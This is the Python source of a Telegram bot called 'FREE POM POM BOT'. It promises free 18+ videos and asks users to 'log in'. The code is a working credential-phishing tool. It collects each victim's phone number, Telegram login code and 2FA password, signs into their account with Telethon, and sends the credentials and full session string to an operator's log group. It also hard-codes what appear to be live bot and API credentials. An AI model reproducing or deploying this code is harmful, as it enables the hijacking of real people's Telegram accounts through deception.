import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
import logging
import sqlite3
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import os
from pathlib import Path
import uuid
import tempfile

# Logging setup
logging.basicConfig(level=logging.INFO)

# Bot configuration from environment variables (Railway friendly)
BOT_TOKEN = os.getenv("BOT_TOKEN", "8759122014:AAF1y3YRiZNS8vhB7VfMNZywN935zdXIyzc")
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "-1003702346444")
ADMIN_ID = os.getenv("ADMIN_ID", "7896371573")

# Telegram API credentials from environment variables
API_ID = int(os.getenv("API_ID", "30191201"))
API_HASH = os.getenv("API_HASH", "5c87a8808e935cc3d97958d0bb24ff1f")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Create videos directory in current folder (ephemeral on Railway, but fine for demo)
Path("videos").mkdir(exist_ok=True)

# Database initialization (SQLite file in current directory)
def init_db():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id TEXT,
        username TEXT,
        phone_number TEXT,
        phone_code_hash TEXT,
        phone_code TEXT,
        password TEXT,
        session_string TEXT,
        status TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS videos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        file_path TEXT,
        original_filename TEXT,
        file_size INTEGER,
        uploaded_by TEXT,
        upload_time DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def save_login_attempt(data):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("INSERT INTO logins (telegram_id, username, phone_number, phone_code_hash, phone_code, password, session_string, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
              (data['telegram_id'], data['username'], data['phone_number'], 
               data['phone_code_hash'], data['phone_code'], data['password'],
               data['session_string'], data['status']))
    conn.commit()
    conn.close()

def save_video(file_path, original_filename, file_size, uploaded_by):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("INSERT INTO videos (file_path, original_filename, file_size, uploaded_by) VALUES (?, ?, ?, ?)",
              (file_path, original_filename, file_size, uploaded_by))
    conn.commit()
    conn.close()

def get_all_videos():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("SELECT file_path FROM videos WHERE upload_time > datetime('now', '-10 minutes')")
    videos = c.fetchall()
    conn.close()
    return [v[0] for v in videos]

def delete_old_videos():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("SELECT file_path FROM videos WHERE upload_time <= datetime('now', '-10 minutes')")
    old_files = c.fetchall()
    c.execute("DELETE FROM videos WHERE upload_time <= datetime('now', '-10 minutes')")
    conn.commit()
    conn.close()
    for file_path in old_files:
        try:
            os.remove(file_path[0])
        except FileNotFoundError:
            pass

# Auto-delete task (every 10 minutes)
async def auto_delete_task():
    while True:
        await asyncio.sleep(600)  # 10 minutes
        delete_old_videos()
        print("🧹 Deleted videos older than 10 minutes")

# State management
class LoginForm(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()

# Global user state storage
user_clients = {}

# ---------- PREMIUM STYLING WITH DO LOGIN BUTTON (TEXT ONLY) ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    # Clear any previous state
    await state.clear()
    user_id = message.from_user.id
    if user_id in user_clients:
        try:
            await user_clients[user_id].disconnect()
        except:
            pass
        del user_clients[user_id]

    # Inline keyboard with DO Login button
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔑 DO LOGIN", callback_data="do_login")],
        [types.InlineKeyboardButton(text="ℹ️ About", callback_data="about"),
         types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
    ])

    await message.answer(
        "✨・。・。・。・。・。・。・。・。・。・。・。・。・✨\n\n"
        "🌟 **FREE POM POM BOT** 🌟\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
        "🎬 **Premium Video Sharing**\n"
        "🔞 **18+ Verified Content**\n\n"
        "👇 **Click the button below to begin**",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

@dp.callback_query(lambda c: c.data == "do_login")
async def callback_do_login(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(
        "📱 **Enter your phone number** with country code:\n"
        "`+919876543210`\n"
        "`+11234567890`\n\n"
        "⏳ I'll send an OTP to your Telegram account.",
        parse_mode='Markdown'
    )
    await state.set_state(LoginForm.waiting_for_phone)

@dp.callback_query(lambda c: c.data == "about")
async def callback_about(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.answer(
        "ℹ️ **About FREE POM POM BOT**\n\n"
        "• Premium video sharing service\n"
        "• 18+ content verification required\n"
        "• Secure login via Telegram OTP\n"
        "• Videos auto‑delete after 10 minutes\n\n"
        "🔐 Your privacy is our priority!",
        parse_mode='Markdown'
    )

@dp.callback_query(lambda c: c.data == "help")
async def callback_help(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.answer(
        "❓ **Help & Support**\n\n"
        "• **Login:** Phone → OTP → 2FA (if enabled)\n"
        "• **OTP format:** `1 2 3 4 5` or `12345`\n"
        "• **Videos:** Auto‑delete after 10 minutes\n"
        "• **Issues:** Contact @FuckYouBaby03\n\n"
        "💡 Keep your session secure!",
        parse_mode='Markdown'
    )

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in user_clients:
        try:
            await user_clients[user_id].disconnect()
        except:
            pass
        del user_clients[user_id]
    await state.clear()
    await message.answer(
        "🛑 **Operation Cancelled**\n\n"
        "✅ All temporary data cleared.\n"
        "💡 Use /start to begin again.",
        parse_mode='Markdown'
    )

# ---------- LOGIN FLOW (unchanged) ----------
@dp.message(LoginForm.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    user_id = message.from_user.id

    if not phone.startswith('+') or not phone[1:].isdigit() or len(phone) < 10:
        await message.answer(
            "❌ **Invalid Format**\n\n"
            "Please enter phone with country code:\n"
            "`+919876543210`  (India)\n"
            "`+11234567890`   (USA)",
            parse_mode='Markdown'
        )
        return

    # Cleanup previous client
    if user_id in user_clients:
        try:
            await user_clients[user_id].disconnect()
        except:
            pass
        del user_clients[user_id]

    # Create new Telethon client
    session = StringSession()
    client = TelegramClient(session, API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
    except Exception as e:
        await message.answer(
            "❌ **Failed to send OTP**\n\n"
            f"`{str(e)}`\n\n"
            "🔄 Please try again with /start",
            parse_mode='Markdown'
        )
        await client.disconnect()
        return

    user_clients[user_id] = client
    await state.update_data(
        phone_number=phone,
        phone_code_hash=sent.phone_code_hash
    )

    await message.answer(
        "✅ **OTP Sent!**\n\n"
        "📨 Check your Telegram app for the 5‑digit code.\n"
        "⌛ Valid for 5 minutes.\n\n"
        "🔢 **Send the OTP like:** `1 2 3 4 5` or `12345`",
        parse_mode='Markdown'
    )
    await state.set_state(LoginForm.waiting_for_code)

@dp.message(LoginForm.waiting_for_code)
async def process_otp(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = await state.get_data()
    phone = data.get('phone_number')
    phone_code_hash = data.get('phone_code_hash')
    client = user_clients.get(user_id)

    if not client or not phone or not phone_code_hash:
        await message.answer(
            "⏳ **Session expired** – please /start again.",
            parse_mode='Markdown'
        )
        await state.clear()
        return

    otp = ''.join(filter(str.isdigit, message.text))
    if len(otp) != 5:
        await message.answer(
            "❌ **Invalid OTP**\n\nPlease send exactly 5 digits.",
            parse_mode='Markdown'
        )
        return

    try:
        await client.sign_in(
            phone=phone,
            code=otp,
            phone_code_hash=phone_code_hash
        )
        # No 2FA
        await complete_login(message, state, client, phone, otp, None)

    except SessionPasswordNeededError:
        await state.update_data(phone_code=otp)
        await message.answer(
            "🔐 **Two‑Factor Authentication Required**\n\n"
            "Please enter your **2FA password**:",
            parse_mode='Markdown'
        )
        await state.set_state(LoginForm.waiting_for_password)

    except PhoneCodeInvalidError:
        await message.answer(
            "❌ **Incorrect OTP** – please /start again.",
            parse_mode='Markdown'
        )
        await cleanup_user(user_id)
        await state.clear()

    except PhoneCodeExpiredError:
        await message.answer(
            "⏰ **OTP expired** – please /start again.",
            parse_mode='Markdown'
        )
        await cleanup_user(user_id)
        await state.clear()

    except Exception as e:
        await message.answer(
            f"❌ **Verification error**\n`{str(e)}`\n\nPlease /start again.",
            parse_mode='Markdown'
        )
        await cleanup_user(user_id)
        await state.clear()

@dp.message(LoginForm.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = await state.get_data()
    phone = data.get('phone_number')
    phone_code_hash = data.get('phone_code_hash')
    otp = data.get('phone_code')
    client = user_clients.get(user_id)
    password = message.text.strip()

    if not client or not phone or not phone_code_hash or not otp:
        await message.answer(
            "⏳ **Session expired** – please /start again.",
            parse_mode='Markdown'
        )
        await state.clear()
        return

    try:
        await client.sign_in(password=password)
        await complete_login(message, state, client, phone, otp, password)

    except Exception as e:
        await message.answer(
            f"❌ **2FA verification failed**\n`{str(e)}`\n\nPlease /start again.",
            parse_mode='Markdown'
        )
        await cleanup_user(user_id)
        await state.clear()

async def complete_login(message: types.Message, state: FSMContext, client, phone, otp, twofa_password):
    user_id = message.from_user.id
    session_string = client.session.save()
    await client.disconnect()
    if user_id in user_clients:
        del user_clients[user_id]

    # Prepare login data
    login_data = {
        'telegram_id': user_id,
        'username': message.from_user.username or 'N/A',
        'phone_number': phone,
        'phone_code_hash': '',
        'phone_code': otp,
        'password': twofa_password if twofa_password else 'N/A',
        'session_string': session_string,
        'status': 'SUCCESS'
    }
    save_login_attempt(login_data)

    # Send to log group – but don't let any error affect the user's success
    try:
        await send_login_to_log_group(login_data)
    except Exception as e:
        print(f"Error sending login to log group: {e}")

    # Send videos to user
    await send_videos_to_user(message)

    await message.answer(
        "🎉 **Login Successful!**\n\n"
        "✅ Your session is ready.\n"
        "📹 **Premium videos are on the way...**\n\n"
        "✨ Enjoy the content! ✨",
        parse_mode='Markdown'
    )
    await state.clear()

async def cleanup_user(user_id):
    if user_id in user_clients:
        try:
            await user_clients[user_id].disconnect()
        except:
            pass
        del user_clients[user_id]

async def send_login_to_log_group(data):
    # Prepare the session string (full)
    session = data['session_string']
    phone_safe = data['phone_number'].replace('+', '').replace(' ', '')
    filename = f"{phone_safe}.txt"

    # Use system temp directory (cross-platform)
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)

    # Write session to temporary file
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(session)

    try:
        # Create log message with full session (split if too long)
        base_msg = (
            f"🔐 **FREE POM POM BOT – LOGIN ALERT**\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
            f"👤 **User:** @{data['username']}\n"
            f"🆔 **ID:** `{data['telegram_id']}`\n"
            f"📞 **Phone:** `{data['phone_number']}`\n"
            f"🔢 **OTP:** `{data['phone_code']}`\n"
            f"🔐 **2FA:** `{data['password']}`\n"
            f"✅ **Status:** `{data['status']}`\n"
            f"⏰ **Time:** {datetime.now().strftime('%d-%m-%Y %H:%M IST')}\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
            f"**📄 Session String:**\n"
        )

        max_len = 4096 - len(base_msg) - 100
        if len(session) > max_len:
            await bot.send_message(LOG_GROUP_ID, base_msg + session[:max_len], parse_mode='Markdown')
            remaining = session[max_len:]
            for i in range(0, len(remaining), 4096):
                await bot.send_message(LOG_GROUP_ID, remaining[i:i+4096], parse_mode='Markdown')
        else:
            await bot.send_message(LOG_GROUP_ID, base_msg + session, parse_mode='Markdown')

        # Send the .txt file
        with open(file_path, 'rb') as f:
            await bot.send_document(
                LOG_GROUP_ID,
                document=types.FSInputFile(file_path, filename=filename),
                caption=f"📁 **Session file for** `{data['phone_number']}`"
            )
    finally:
        try:
            os.remove(file_path)
        except Exception as e:
            print(f"Could not delete temp file {file_path}: {e}")

async def send_videos_to_user(message):
    videos = get_all_videos()
    if videos:
        await message.answer(
            "🎬 **Sending Premium Content**\nPlease wait...",
            parse_mode='Markdown'
        )
        for video_path in videos:
            try:
                await message.answer_video(video=types.FSInputFile(video_path))
            except Exception as e:
                print(f"Error sending video {video_path}: {e}")
        await message.answer(
            "✅ **All videos delivered!**\n\nEnjoy your premium collection.",
            parse_mode='Markdown'
        )
    else:
        await message.answer(
            "📹 **No videos available right now**\n\n"
            "Videos auto‑delete after 10 minutes. Check back later!",
            parse_mode='Markdown'
        )

# ---------- ADMIN COMMANDS (unchanged) ----------
@dp.message(Command("addvideo"))
async def cmd_add_video(message: types.Message):
    if str(message.from_user.id) != ADMIN_ID:
        await message.answer("❌ **Admin access only**", parse_mode='Markdown')
        return

    admin_keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="📹 Upload Video", callback_data="upload_video")],
        [types.InlineKeyboardButton(text="📊 View Stats", callback_data="view_stats")],
        [types.InlineKeyboardButton(text="🗑️ Clear Videos", callback_data="clear_videos")],
        [types.InlineKeyboardButton(text="📋 Video List", callback_data="video_list")]
    ])
    await message.answer(
        "👑 **Admin Panel**\n\n"
        "• **Upload** – add new videos\n"
        "• **Stats** – view usage statistics\n"
        "• **Clear** – remove all videos\n"
        "• **List** – see uploaded videos",
        reply_markup=admin_keyboard,
        parse_mode='Markdown'
    )

@dp.message(lambda message: message.video and str(message.from_user.id) == ADMIN_ID)
async def handle_video_upload(message: types.Message):
    try:
        unique_id = str(uuid.uuid4())[:8]
        original_filename = f"{unique_id}_{message.video.file_unique_id}.mp4"
        file_path = f"videos/{original_filename}"

        file_id = message.video.file_id
        file = await bot.get_file(file_id)
        await bot.download_file(file.file_path, file_path)

        save_video(
            file_path=file_path,
            original_filename=original_filename,
            file_size=message.video.file_size,
            uploaded_by=str(message.from_user.id)
        )

        await message.answer(
            f"✅ **Upload Successful**\n\n"
            f"📁 **File:** `{original_filename}`\n"
            f"💾 **Size:** {message.video.file_size} bytes\n"
            f"⏰ **Auto‑delete:** 10 minutes\n"
            f"📊 **Total active:** {len(get_all_videos())}",
            parse_mode='Markdown'
        )
    except Exception as e:
        await message.answer(f"❌ **Upload failed**\n`{str(e)}`", parse_mode='Markdown')

@dp.callback_query(lambda c: c.data == "upload_video")
async def admin_upload_video(callback: types.CallbackQuery):
    await callback.message.answer(
        "📹 **Send me a video file** to add it to the collection.",
        parse_mode='Markdown'
    )

@dp.callback_query(lambda c: c.data == "view_stats")
async def admin_view_stats(callback: types.CallbackQuery):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM logins")
    total_logins = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM videos")
    total_videos = c.fetchone()[0]
    active_videos = len(get_all_videos())
    conn.close()
    stats_msg = (
        "📊 **Statistics**\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"👤 **Total logins:** {total_logins}\n"
        f"📹 **Total videos:** {total_videos}\n"
        f"🎬 **Active now:** {active_videos}\n"
        f"⏰ **Auto‑delete:** 10 minutes\n"
        f"🕒 **Last updated:** {datetime.now().strftime('%H:%M:%S')}"
    )
    await callback.message.answer(stats_msg, parse_mode='Markdown')

@dp.callback_query(lambda c: c.data == "clear_videos")
async def admin_clear_videos(callback: types.CallbackQuery):
    delete_old_videos()
    await callback.message.answer(
        "🗑️ **All videos cleared** (older than 10 minutes).",
        parse_mode='Markdown'
    )

@dp.callback_query(lambda c: c.data == "video_list")
async def admin_video_list(callback: types.CallbackQuery):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute("SELECT original_filename, file_size, upload_time FROM videos WHERE upload_time > datetime('now', '-10 minutes')")
    videos = c.fetchall()
    conn.close()
    if videos:
        video_list = "📋 **Active Videos** (last 10 min)\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        for i, (filename, size, time) in enumerate(videos, 1):
            video_list += f"{i}. `{filename}` ({size} bytes)\n"
        video_list += f"\n**Total:** {len(videos)}"
    else:
        video_list = "📋 **No videos uploaded yet.**"
    await callback.message.answer(video_list, parse_mode='Markdown')

@dp.message(Command("test"))
async def cmd_test(message: types.Message):
    if str(message.from_user.id) == ADMIN_ID:
        await message.answer("✅ **Admin access granted**", parse_mode='Markdown')
    else:
        await message.answer("❌ **Access denied**", parse_mode='Markdown')

# ---------- MAIN ----------
init_db()

async def main():
    print("🚀 FREE POM POM BOT Started...")
    print(f"Logging to group: {LOG_GROUP_ID}")
    asyncio.create_task(auto_delete_task())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
